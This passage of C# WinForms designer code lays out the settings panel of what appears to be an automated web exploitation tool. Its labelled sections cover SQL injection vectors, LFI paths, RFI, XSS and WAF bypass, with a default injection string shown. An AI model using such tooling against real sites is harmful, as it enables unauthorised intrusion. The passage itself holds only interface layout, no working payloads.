		this.pnlSettingsAdvanced.Controls.Add(this.grbScanner);
		this.pnlSettingsAdvanced.Location = new System.Drawing.Point(897, 15);
		this.pnlSettingsAdvanced.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.pnlSettingsAdvanced.Name = "pnlSettingsAdvanced";
		this.pnlSettingsAdvanced.Size = new System.Drawing.Size(620, 1250);
		this.pnlSettingsAdvanced.TabIndex = 35;
		this.pnlSettingsAdvanced.Visible = false;
		this.grbXSS.Controls.Add(this.lvwXSS);
		this.grbXSS.Location = new System.Drawing.Point(3, 795);
		this.grbXSS.Name = "grbXSS";
		this.grbXSS.Size = new System.Drawing.Size(579, 185);
		this.grbXSS.TabIndex = 8;
		this.grbXSS.TabStop = false;
		this.grbXSS.Text = "XSS (Cross Site Scripting)";
		this.lvwXSS.Columns.AddRange(new System.Windows.Forms.ColumnHeader[2] { this.ColumnHeader36, this.ColumnHeader37 });
		this.lvwXSS.ContextMenuStrip = this.mnuPaths;
		this.lvwXSS.FullRowSelect = true;
		this.lvwXSS.GridLines = true;
		this.lvwXSS.HideSelection = false;
		this.lvwXSS.Location = new System.Drawing.Point(10, 22);
		this.lvwXSS.MultiSelect = false;
		this.lvwXSS.Name = "lvwXSS";
		this.lvwXSS.Size = new System.Drawing.Size(550, 156);
		this.lvwXSS.TabIndex = 1;
		this.lvwXSS.UseCompatibleStateImageBehavior = false;
		this.lvwXSS.View = System.Windows.Forms.View.Details;
		this.ColumnHeader36.Text = "Vector";
		this.ColumnHeader36.Width = 189;
		this.ColumnHeader37.Text = "Keyword";
		this.ColumnHeader37.Width = 140;
		this.mnuPaths.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.mnuPaths.Items.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.mnuPathAdd, this.mnuPathEdit, this.mnuPathRem });
		this.mnuPaths.Name = "mnuChecked";
		this.mnuPaths.ShowImageMargin = false;
		this.mnuPaths.ShowItemToolTips = false;
		this.mnuPaths.Size = new System.Drawing.Size(124, 94);
		this.mnuPathAdd.Name = "mnuPathAdd";
		this.mnuPathAdd.Size = new System.Drawing.Size(123, 30);
		this.mnuPathAdd.Text = "Add";
		this.mnuPathEdit.Name = "mnuPathEdit";
		this.mnuPathEdit.Size = new System.Drawing.Size(123, 30);
		this.mnuPathEdit.Text = "Edit";
		this.mnuPathRem.Name = "mnuPathRem";
		this.mnuPathRem.Size = new System.Drawing.Size(123, 30);
		this.mnuPathRem.Text = "Remove";
		this.grbLfiLinux.Controls.Add(this.tabFileInc);
		this.grbLfiLinux.Location = new System.Drawing.Point(3, 540);
		this.grbLfiLinux.Name = "grbLfiLinux";
		this.grbLfiLinux.Size = new System.Drawing.Size(579, 255);
		this.grbLfiLinux.TabIndex = 0;
		this.grbLfiLinux.TabStop = false;
		this.grbLfiLinux.Text = "LFI (Local File Inclusion)";
		this.tabFileInc.Alignment = System.Windows.Forms.TabAlignment.Top;
		this.tabFileInc.Controls.Add(this.TabPage6);
		this.tabFileInc.Controls.Add(this.tpLfiWin);
		this.tabFileInc.Dock = System.Windows.Forms.DockStyle.Fill;
		this.tabFileInc.Location = new System.Drawing.Point(3, 22);
		this.tabFileInc.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.tabFileInc.Name = "tabFileInc";
		this.tabFileInc.SelectedIndex = 0;
		this.tabFileInc.Size = new System.Drawing.Size(573, 230);
		this.tabFileInc.TabIndex = 0;
		this.TabPage6.Controls.Add(this.numLFIpathTraversalCount);
		this.TabPage6.Controls.Add(this.lblLFIPathCount);
		this.TabPage6.Controls.Add(this.lvwLFIpathLinux);
		this.TabPage6.Location = new System.Drawing.Point(4, 29);
		this.TabPage6.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.TabPage6.Name = "TabPage6";
		this.TabPage6.Padding = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.TabPage6.Size = new System.Drawing.Size(565, 197);
		this.TabPage6.TabIndex = 0;
		this.TabPage6.Text = "Linux";
		this.TabPage6.UseVisualStyleBackColor = true;
		this.numLFIpathTraversalCount.Location = new System.Drawing.Point(6, 9);
		this.numLFIpathTraversalCount.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.numLFIpathTraversalCount.Maximum = new decimal(new int[4] { 20, 0, 0, 0 });
		this.numLFIpathTraversalCount.Minimum = new decimal(new int[4] { 1, 0, 0, 0 });
		this.numLFIpathTraversalCount.Name = "numLFIpathTraversalCount";
		this.numLFIpathTraversalCount.Size = new System.Drawing.Size(58, 26);
		this.numLFIpathTraversalCount.TabIndex = 0;
		this.numLFIpathTraversalCount.Value = new decimal(new int[4] { 10, 0, 0, 0 });
		this.lvwLFIpathLinux.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.lvwLFIpathLinux.Columns.AddRange(new System.Windows.Forms.ColumnHeader[2] { this.ColumnHeader5, this.ColumnHeader7 });
		this.lvwLFIpathLinux.ContextMenuStrip = this.mnuPaths;
		this.lvwLFIpathLinux.FullRowSelect = true;
		this.lvwLFIpathLinux.GridLines = true;
		this.lvwLFIpathLinux.HideSelection = false;
		this.lvwLFIpathLinux.Location = new System.Drawing.Point(4, 48);
		this.lvwLFIpathLinux.MultiSelect = false;
		this.lvwLFIpathLinux.Name = "lvwLFIpathLinux";
		this.lvwLFIpathLinux.Size = new System.Drawing.Size(550, 146);
		this.lvwLFIpathLinux.TabIndex = 2;
		this.lvwLFIpathLinux.UseCompatibleStateImageBehavior = false;
		this.lvwLFIpathLinux.View = System.Windows.Forms.View.Details;
		this.ColumnHeader5.Text = "Path";
		this.ColumnHeader5.Width = 190;
		this.ColumnHeader7.Text = "Keyword";
		this.ColumnHeader7.Width = 140;
		this.tpLfiWin.Controls.Add(this.lvwLFIpathWin);
		this.tpLfiWin.Location = new System.Drawing.Point(4, 29);
		this.tpLfiWin.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.tpLfiWin.Name = "tpLfiWin";
		this.tpLfiWin.Padding = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.tpLfiWin.Size = new System.Drawing.Size(565, 197);
		this.tpLfiWin.TabIndex = 1;
		this.tpLfiWin.Text = "Windows";
		this.tpLfiWin.UseVisualStyleBackColor = true;
		this.lvwLFIpathWin.Columns.AddRange(new System.Windows.Forms.ColumnHeader[2] { this.ColumnHeader8, this.ColumnHeader9 });
		this.lvwLFIpathWin.ContextMenuStrip = this.mnuPaths;
		this.lvwLFIpathWin.Dock = System.Windows.Forms.DockStyle.Fill;
		this.lvwLFIpathWin.FullRowSelect = true;
		this.lvwLFIpathWin.GridLines = true;
		this.lvwLFIpathWin.HideSelection = false;
		this.lvwLFIpathWin.Location = new System.Drawing.Point(4, 5);
		this.lvwLFIpathWin.MultiSelect = false;
		this.lvwLFIpathWin.Name = "lvwLFIpathWin";
		this.lvwLFIpathWin.Size = new System.Drawing.Size(557, 187);
		this.lvwLFIpathWin.TabIndex = 0;
		this.lvwLFIpathWin.UseCompatibleStateImageBehavior = false;
		this.lvwLFIpathWin.View = System.Windows.Forms.View.Details;
		this.ColumnHeader8.Text = "Path";
		this.ColumnHeader8.Width = 190;
		this.ColumnHeader9.Text = "Keyword";
		this.ColumnHeader9.Width = 140;
		this.grbSQLi.Controls.Add(this.tabSQLi);
		this.grbSQLi.Location = new System.Drawing.Point(3, 231);
		this.grbSQLi.Name = "grbSQLi";
		this.grbSQLi.Size = new System.Drawing.Size(579, 309);
		this.grbSQLi.TabIndex = 6;
		this.grbSQLi.TabStop = false;
		this.grbSQLi.Text = "SQLi (SQL Injection)";
		this.tabSQLi.Alignment = System.Windows.Forms.TabAlignment.Top;
		this.tabSQLi.Controls.Add(this.TabPage1);
		this.tabSQLi.Controls.Add(this.TabPage2);
		this.tabSQLi.Controls.Add(this.TabPage3);
		this.tabSQLi.Dock = System.Windows.Forms.DockStyle.Fill;
		this.tabSQLi.Location = new System.Drawing.Point(3, 22);
		this.tabSQLi.Name = "tabSQLi";
		this.tabSQLi.SelectedIndex = 0;
		this.tabSQLi.Size = new System.Drawing.Size(573, 284);
		this.tabSQLi.TabIndex = 125;
		this.TabPage1.Controls.Add(this.chkAnalizeMsAcessSybase);
		this.TabPage1.Controls.Add(this.chkAnalizerPostgreErrorUnion);
		this.TabPage1.Controls.Add(this.chkAnalizerOracleErrorUnion);
		this.TabPage1.Controls.Add(this.txtAnalizerExploitCode);
		this.TabPage1.Controls.Add(this.chkAnalizerMySQLErrorUnion);
		this.TabPage1.Controls.Add(this.numAnalizerUnionEnd);
		this.TabPage1.Controls.Add(this.chkAnalizerMSSQLErrorUnion);
		this.TabPage1.Controls.Add(this.chkAnalizeWAF);
		this.TabPage1.Controls.Add(this.numAnalizerUnionSart);
		this.TabPage1.Controls.Add(this.lblSQLiExploitCode);
		this.TabPage1.Controls.Add(this.lblSQLiUnionCount);
		this.TabPage1.Controls.Add(this.lblSQLiUnionTo);
		this.TabPage1.Controls.Add(this.chkAnalizeMySQLReadWrite);
		this.TabPage1.Location = new System.Drawing.Point(4, 29);
		this.TabPage1.Name = "TabPage1";
		this.TabPage1.Padding = new System.Windows.Forms.Padding(3);
		this.TabPage1.Size = new System.Drawing.Size(565, 251);
		this.TabPage1.TabIndex = 0;
		this.TabPage1.Text = "General";
		this.TabPage1.UseVisualStyleBackColor = true;
		this.chkAnalizeMsAcessSybase.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.chkAnalizeMsAcessSybase.Checked = true;
		this.chkAnalizeMsAcessSybase.CheckState = System.Windows.Forms.CheckState.Checked;
		this.chkAnalizeMsAcessSybase.ForeColor = System.Drawing.SystemColors.ControlText;
		this.chkAnalizeMsAcessSybase.Location = new System.Drawing.Point(12, 155);
		this.chkAnalizeMsAcessSybase.Name = "chkAnalizeMsAcessSybase";
		this.chkAnalizeMsAcessSybase.Size = new System.Drawing.Size(436, 25);
		this.chkAnalizeMsAcessSybase.TabIndex = 130;
		this.chkAnalizeMsAcessSybase.Text = "Add MsAccess and Sybase to Non-Injecables";
		this.chkAnalizeMsAcessSybase.UseVisualStyleBackColor = true;
		this.chkAnalizerPostgreErrorUnion.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.chkAnalizerPostgreErrorUnion.ForeColor = System.Drawing.SystemColors.ControlText;
		this.chkAnalizerPostgreErrorUnion.Location = new System.Drawing.Point(12, 82);
		this.chkAnalizerPostgreErrorUnion.Name = "chkAnalizerPostgreErrorUnion";
		this.chkAnalizerPostgreErrorUnion.Size = new System.Drawing.Size(436, 25);
		this.chkAnalizerPostgreErrorUnion.TabIndex = 129;
		this.chkAnalizerPostgreErrorUnion.Text = "Check Union in PostgreSQL Error";
		this.chkAnalizerPostgreErrorUnion.UseVisualStyleBackColor = true;
		this.chkAnalizerOracleErrorUnion.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.chkAnalizerOracleErrorUnion.ForeColor = System.Drawing.SystemColors.ControlText;
		this.chkAnalizerOracleErrorUnion.Location = new System.Drawing.Point(12, 55);
		this.chkAnalizerOracleErrorUnion.Name = "chkAnalizerOracleErrorUnion";
		this.chkAnalizerOracleErrorUnion.Size = new System.Drawing.Size(436, 25);
		this.chkAnalizerOracleErrorUnion.TabIndex = 128;
		this.chkAnalizerOracleErrorUnion.Text = "Check Union in Oracle Error";
		this.chkAnalizerOracleErrorUnion.UseVisualStyleBackColor = true;
		this.txtAnalizerExploitCode.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
		this.txtAnalizerExploitCode.Location = new System.Drawing.Point(182, 220);
		this.txtAnalizerExploitCode.Name = "txtAnalizerExploitCode";
		this.txtAnalizerExploitCode.Size = new System.Drawing.Size(145, 26);
		this.txtAnalizerExploitCode.TabIndex = 125;
		this.txtAnalizerExploitCode.Text = "'[0]";
		this.chkAnalizerMySQLErrorUnion.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.chkAnalizerMySQLErrorUnion.Checked = true;
		this.chkAnalizerMySQLErrorUnion.CheckState = System.Windows.Forms.CheckState.Checked;
		this.chkAnalizerMySQLErrorUnion.ForeColor = System.Drawing.SystemColors.ControlText;
		this.chkAnalizerMySQLErrorUnion.Location = new System.Drawing.Point(12, 6);
		this.chkAnalizerMySQLErrorUnion.Name = "chkAnalizerMySQLErrorUnion";
		this.chkAnalizerMySQLErrorUnion.Size = new System.Drawing.Size(436, 25);
		this.chkAnalizerMySQLErrorUnion.TabIndex = 41;
		this.chkAnalizerMySQLErrorUnion.Text = "Check Union in MySQL Error";
		this.chkAnalizerMySQLErrorUnion.UseVisualStyleBackColor = true;
		this.numAnalizerUnionEnd.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
		this.numAnalizerUnionEnd.Location = new System.Drawing.Point(100, 220);
		this.numAnalizerUnionEnd.Minimum = new decimal(new int[4] { 2, 0, 0, 0 });
		this.numAnalizerUnionEnd.Name = "numAnalizerUnionEnd";
		this.numAnalizerUnionEnd.Size = new System.Drawing.Size(58, 26);
		this.numAnalizerUnionEnd.TabIndex = 13;
		this.numAnalizerUnionEnd.TextAlign = System.Windows.Forms.HorizontalAlignment.Right;
		this.numAnalizerUnionEnd.Value = new decimal(new int[4] { 35, 0, 0, 0 });
		this.chkAnalizerMSSQLErrorUnion.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.chkAnalizerMSSQLErrorUnion.ForeColor = System.Drawing.SystemColors.ControlText;
		this.chkAnalizerMSSQLErrorUnion.Location = new System.Drawing.Point(12, 31);
		this.chkAnalizerMSSQLErrorUnion.Name = "chkAnalizerMSSQLErrorUnion";
		this.chkAnalizerMSSQLErrorUnion.Size = new System.Drawing.Size(436, 25);
		this.chkAnalizerMSSQLErrorUnion.TabIndex = 42;
		this.chkAnalizerMSSQLErrorUnion.Text = "Check Union in MS SQL Error";
		this.chkAnalizerMSSQLErrorUnion.UseVisualStyleBackColor = true;
		this.chkAnalizeWAF.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.chkAnalizeWAF.Checked = true;
		this.chkAnalizeWAF.CheckState = System.Windows.Forms.CheckState.Checked;
		this.chkAnalizeWAF.ForeColor = System.Drawing.SystemColors.ControlText;
		this.chkAnalizeWAF.Location = new System.Drawing.Point(12, 131);
		this.chkAnalizeWAF.Name = "chkAnalizeWAF";
		this.chkAnalizeWAF.Size = new System.Drawing.Size(436, 25);
		this.chkAnalizeWAF.TabIndex = 43;
		this.chkAnalizeWAF.Text = "Enable WAFs";
		this.chkAnalizeWAF.UseVisualStyleBackColor = true;
		this.numAnalizerUnionSart.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
		this.numAnalizerUnionSart.Location = new System.Drawing.Point(6, 220);
		this.numAnalizerUnionSart.Maximum = new decimal(new int[4] { 20, 0, 0, 0 });
		this.numAnalizerUnionSart.Minimum = new decimal(new int[4] { 1, 0, 0, 0 });
		this.numAnalizerUnionSart.Name = "numAnalizerUnionSart";
		this.numAnalizerUnionSart.Size = new System.Drawing.Size(58, 26);
		this.numAnalizerUnionSart.TabIndex = 12;
		this.numAnalizerUnionSart.TextAlign = System.Windows.Forms.HorizontalAlignment.Right;
		this.numAnalizerUnionSart.Value = new decimal(new int[4] { 1, 0, 0, 0 });
		this.lblSQLiExploitCode.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
		this.lblSQLiExploitCode.Location = new System.Drawing.Point(178, 189);
		this.lblSQLiExploitCode.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.lblSQLiExploitCode.Name = "lblSQLiExploitCode";
		this.lblSQLiExploitCode.Size = new System.Drawing.Size(148, 26);
		this.lblSQLiExploitCode.TabIndex = 126;
		this.lblSQLiExploitCode.Text = "Exploit Code";
		this.lblSQLiExploitCode.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.lblSQLiUnionCount.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
		this.lblSQLiUnionCount.ForeColor = System.Drawing.SystemColors.ControlText;
		this.lblSQLiUnionCount.Location = new System.Drawing.Point(6, 194);
		this.lblSQLiUnionCount.Name = "lblSQLiUnionCount";
		this.lblSQLiUnionCount.Size = new System.Drawing.Size(208, 18);
		this.lblSQLiUnionCount.TabIndex = 124;
		this.lblSQLiUnionCount.Text = "&Union Column Count";
		this.lblSQLiUnionCount.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.lblSQLiUnionTo.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
		this.lblSQLiUnionTo.AutoSize = true;
		this.lblSQLiUnionTo.ForeColor = System.Drawing.SystemColors.ControlText;
		this.lblSQLiUnionTo.Location = new System.Drawing.Point(70, 220);
		this.lblSQLiUnionTo.Name = "lblSQLiUnionTo";
		this.lblSQLiUnionTo.Size = new System.Drawing.Size(27, 20);
		this.lblSQLiUnionTo.TabIndex = 15;
		this.lblSQLiUnionTo.Text = "&To";
		this.lblSQLiUnionTo.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkAnalizeMySQLReadWrite.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.chkAnalizeMySQLReadWrite.Checked = true;
		this.chkAnalizeMySQLReadWrite.CheckState = System.Windows.Forms.CheckState.Checked;
		this.chkAnalizeMySQLReadWrite.ForeColor = System.Drawing.SystemColors.ControlText;
		this.chkAnalizeMySQLReadWrite.Location = new System.Drawing.Point(12, 106);
		this.chkAnalizeMySQLReadWrite.Name = "chkAnalizeMySQLReadWrite";
		this.chkAnalizeMySQLReadWrite.Size = new System.Drawing.Size(436, 25);
		this.chkAnalizeMySQLReadWrite.TabIndex = 131;
		this.chkAnalizeMySQLReadWrite.Text = "Check MySQL Read\\Write File";
		this.chkAnalizeMySQLReadWrite.UseVisualStyleBackColor = true;
		this.TabPage2.Controls.Add(this.lstAnalizerUnion);
		this.TabPage2.Location = new System.Drawing.Point(4, 29);
		this.TabPage2.Name = "TabPage2";
		this.TabPage2.Padding = new System.Windows.Forms.Padding(3);
		this.TabPage2.Size = new System.Drawing.Size(565, 251);
		this.TabPage2.TabIndex = 1;
		this.TabPage2.Text = "Unions Vectors ";
		this.TabPage2.UseVisualStyleBackColor = true;
		this.lstAnalizerUnion.ContextMenuStrip = this.mnuPaths;
		this.lstAnalizerUnion.Dock = System.Windows.Forms.DockStyle.Fill;
		this.lstAnalizerUnion.FormattingEnabled = true;
		this.lstAnalizerUnion.IntegralHeight = false;
		this.lstAnalizerUnion.Location = new System.Drawing.Point(3, 3);
		this.lstAnalizerUnion.Name = "lstAnalizerUnion";
		this.lstAnalizerUnion.Size = new System.Drawing.Size(559, 245);
		this.lstAnalizerUnion.TabIndex = 1;
		this.lstAnalizerUnion.ThreeDCheckBoxes = true;
		this.lstAnalizerUnion.UseTabStops = false;
		this.TabPage3.Controls.Add(this.lstAnalizerError);
		this.TabPage3.Location = new System.Drawing.Point(4, 29);
		this.TabPage3.Name = "TabPage3";
		this.TabPage3.Padding = new System.Windows.Forms.Padding(3);
		this.TabPage3.Size = new System.Drawing.Size(565, 251);
		this.TabPage3.TabIndex = 2;
		this.TabPage3.Text = "Error Vectors ";
		this.TabPage3.UseVisualStyleBackColor = true;
		this.lstAnalizerError.ContextMenuStrip = this.mnuPaths;
		this.lstAnalizerError.Dock = System.Windows.Forms.DockStyle.Fill;
		this.lstAnalizerError.FormattingEnabled = true;
		this.lstAnalizerError.IntegralHeight = false;
		this.lstAnalizerError.Location = new System.Drawing.Point(3, 3);
		this.lstAnalizerError.Name = "lstAnalizerError";
		this.lstAnalizerError.Size = new System.Drawing.Size(559, 245);
		this.lstAnalizerError.TabIndex = 2;
		this.lstAnalizerError.ThreeDCheckBoxes = true;
		this.lstAnalizerError.UseTabStops = false;
		this.grbHTTPExploit.Controls.Add(this.chkSkipHttpStatus4xx);
		this.grbHTTPExploit.Controls.Add(this.chkExploitIgnoreCookies);
		this.grbHTTPExploit.Controls.Add(this.chkLfiWindowsSkip);
		this.grbHTTPExploit.Location = new System.Drawing.Point(411, 1078);
		this.grbHTTPExploit.Name = "grbHTTPExploit";
		this.grbHTTPExploit.Size = new System.Drawing.Size(171, 200);
		this.grbHTTPExploit.TabIndex = 5;
		this.grbHTTPExploit.TabStop = false;
		this.grbHTTPExploit.Text = "HTTP Exploit Setup";
		this.chkSkipHttpStatus4xx.Checked = true;
		this.chkSkipHttpStatus4xx.CheckState = System.Windows.Forms.CheckState.Checked;
		this.chkSkipHttpStatus4xx.Location = new System.Drawing.Point(8, 91);
		this.chkSkipHttpStatus4xx.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.chkSkipHttpStatus4xx.Name = "chkSkipHttpStatus4xx";
		this.chkSkipHttpStatus4xx.Size = new System.Drawing.Size(158, 49);
		this.chkSkipHttpStatus4xx.TabIndex = 1;
		this.chkSkipHttpStatus4xx.Text = "Skip HTTP Satus 4xx Client Error";
		this.chkSkipHttpStatus4xx.UseVisualStyleBackColor = true;
		this.chkExploitIgnoreCookies.Location = new System.Drawing.Point(8, 22);
		this.chkExploitIgnoreCookies.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.chkExploitIgnoreCookies.Name = "chkExploitIgnoreCookies";
		this.chkExploitIgnoreCookies.Size = new System.Drawing.Size(158, 69);
		this.chkExploitIgnoreCookies.TabIndex = 0;
		this.chkExploitIgnoreCookies.Text = "Try also as \"Ignore tracking cookies WAF\"";
		this.chkExploitIgnoreCookies.UseVisualStyleBackColor = true;
		this.chkLfiWindowsSkip.Checked = true;
		this.chkLfiWindowsSkip.CheckState = System.Windows.Forms.CheckState.Checked;
		this.chkLfiWindowsSkip.Location = new System.Drawing.Point(8, 135);
		this.chkLfiWindowsSkip.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.chkLfiWindowsSkip.Name = "chkLfiWindowsSkip";
		this.chkLfiWindowsSkip.Size = new System.Drawing.Size(158, 58);
		this.chkLfiWindowsSkip.TabIndex = 2;
		this.chkLfiWindowsSkip.Text = "Disable LFI on Windows Server";
		this.chkLfiWindowsSkip.UseVisualStyleBackColor = true;
		this.grbFileIncWAFs.Controls.Add(this.lvwWafs);
		this.grbFileIncWAFs.Location = new System.Drawing.Point(3, 1078);
		this.grbFileIncWAFs.Name = "grbFileIncWAFs";
		this.grbFileIncWAFs.Size = new System.Drawing.Size(402, 200);
		this.grbFileIncWAFs.TabIndex = 4;
		this.grbFileIncWAFs.TabStop = false;
		this.grbFileIncWAFs.Text = "WAF Bypass (LFI/RFI)";
		this.lvwWafs.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.lvwWafs.Columns.AddRange(new System.Windows.Forms.ColumnHeader[2] { this.ColumnHeader11, this.ColumnHeader12 });
		this.lvwWafs.ContextMenuStrip = this.mnuPaths;
		this.lvwWafs.FullRowSelect = true;
		this.lvwWafs.HideSelection = false;
		this.lvwWafs.Location = new System.Drawing.Point(8, 25);
		this.lvwWafs.MultiSelect = false;
		this.lvwWafs.Name = "lvwWafs";
		this.lvwWafs.Size = new System.Drawing.Size(384, 166);
		this.lvwWafs.TabIndex = 8;
		this.lvwWafs.UseCompatibleStateImageBehavior = false;
		this.lvwWafs.View = System.Windows.Forms.View.Details;
		this.ColumnHeader11.Text = "Outset";
		this.ColumnHeader11.Width = 90;
		this.ColumnHeader12.Text = "Ending";
		this.ColumnHeader12.Width = 90;
		this.lblAdvanced.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.lblAdvanced.ForeColor = System.Drawing.Color.Black;
		this.lblAdvanced.Location = new System.Drawing.Point(3, 1278);
		this.lblAdvanced.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.lblAdvanced.Name = "lblAdvanced";
		this.lblAdvanced.Size = new System.Drawing.Size(579, 34);
		this.lblAdvanced.TabIndex = 3;
		this.lblAdvanced.Text = "github.com/AngelSecurityTeam";
		this.lblAdvanced.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.grbRFI.Controls.Add(this.txtRFIkeyword);
		this.grbRFI.Controls.Add(this.txtRFIurl);
		this.grbRFI.Controls.Add(this.lblRFIkeyword);
		this.grbRFI.Controls.Add(this.lblRFIurl);
		this.grbRFI.Location = new System.Drawing.Point(3, 978);
		this.grbRFI.Name = "grbRFI";
		this.grbRFI.Size = new System.Drawing.Size(579, 100);
		this.grbRFI.TabIndex = 2;
		this.grbRFI.TabStop = false;
		this.grbRFI.Text = "RFI (Remote File Include)";
		this.txtRFIkeyword.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.txtRFIkeyword.CharacterCasing = System.Windows.Forms.CharacterCasing.Lower;
		this.txtRFIkeyword.Location = new System.Drawing.Point(126, 58);
		this.txtRFIkeyword.Name = "txtRFIkeyword";
		this.txtRFIkeyword.Size = new System.Drawing.Size(434, 26);
		this.txtRFIkeyword.TabIndex = 1;
		this.txtRFIkeyword.Text = "{window.google=";
		this.txtRFIurl.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.txtRFIurl.CharacterCasing = System.Windows.Forms.CharacterCasing.Lower;
		this.txtRFIurl.Location = new System.Drawing.Point(126, 25);
		this.txtRFIurl.Name = "txtRFIurl";
		this.txtRFIurl.Size = new System.Drawing.Size(434, 26);
		this.txtRFIurl.TabIndex = 0;
		this.txtRFIurl.Text = "http://www.google.com";
		this.lblRFIkeyword.Location = new System.Drawing.Point(14, 57);
		this.lblRFIkeyword.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.lblRFIkeyword.Name = "lblRFIkeyword";
		this.lblRFIkeyword.Size = new System.Drawing.Size(106, 26);
		this.lblRFIkeyword.TabIndex = 40;
		this.lblRFIkeyword.Text = "Keyword";
		this.lblRFIkeyword.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.lblRFIurl.Location = new System.Drawing.Point(14, 25);
		this.lblRFIurl.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.lblRFIurl.Name = "lblRFIurl";
		this.lblRFIurl.Size = new System.Drawing.Size(106, 26);
		this.lblRFIurl.TabIndex = 38;
		this.lblRFIurl.Text = "URL";
		this.lblRFIurl.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.grbScanner.Controls.Add(this.tabScanner);
		this.grbScanner.Location = new System.Drawing.Point(3, 3);
		this.grbScanner.Name = "grbScanner";
		this.grbScanner.Size = new System.Drawing.Size(579, 228);
		this.grbScanner.TabIndex = 7;
		this.grbScanner.TabStop = false;
		this.grbScanner.Text = "Scanner Domain";
		this.tabScanner.Alignment = System.Windows.Forms.TabAlignment.Top;
		this.tabScanner.Controls.Add(this.TabPage4);
		this.tabScanner.Controls.Add(this.TabPage5);
		this.tabScanner.Dock = System.Windows.Forms.DockStyle.Fill;
		this.tabScanner.Location = new System.Drawing.Point(3, 22);
		this.tabScanner.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.tabScanner.Name = "tabScanner";
		this.tabScanner.SelectedIndex = 0;
		this.tabScanner.Size = new System.Drawing.Size(573, 203);
		this.tabScanner.TabIndex = 0;
		this.TabPage4.Controls.Add(this.lvwScannerDomain);
		this.TabPage4.Location = new System.Drawing.Point(4, 29);
		this.TabPage4.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.TabPage4.Name = "TabPage4";
		this.TabPage4.Padding = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.TabPage4.Size = new System.Drawing.Size(565, 170);
		this.TabPage4.TabIndex = 0;
		this.TabPage4.Text = "Domain";
		this.TabPage4.UseVisualStyleBackColor = true;
		this.lvwScannerDomain.Columns.AddRange(new System.Windows.Forms.ColumnHeader[2] { this.ColumnHeader32, this.ColumnHeader33 });
		this.lvwScannerDomain.ContextMenuStrip = this.mnuScannerDomain;
		this.lvwScannerDomain.Dock = System.Windows.Forms.DockStyle.Fill;
		this.lvwScannerDomain.FullRowSelect = true;
		this.lvwScannerDomain.GridLines = true;
		this.lvwScannerDomain.HideSelection = false;
		this.lvwScannerDomain.Location = new System.Drawing.Point(4, 5);
		this.lvwScannerDomain.MultiSelect = false;
		this.lvwScannerDomain.Name = "lvwScannerDomain";
		this.lvwScannerDomain.Size = new System.Drawing.Size(557, 160);
		this.lvwScannerDomain.TabIndex = 0;
		this.lvwScannerDomain.UseCompatibleStateImageBehavior = false;
		this.lvwScannerDomain.View = System.Windows.Forms.View.Details;
		this.ColumnHeader32.Text = "Host";
		this.ColumnHeader32.Width = 152;
		this.ColumnHeader33.Text = "Domain";
		this.ColumnHeader33.Width = 95;
		this.mnuScannerDomain.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.mnuScannerDomain.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.ScannerDomainEdit });
		this.mnuScannerDomain.Name = "mnuChecked";
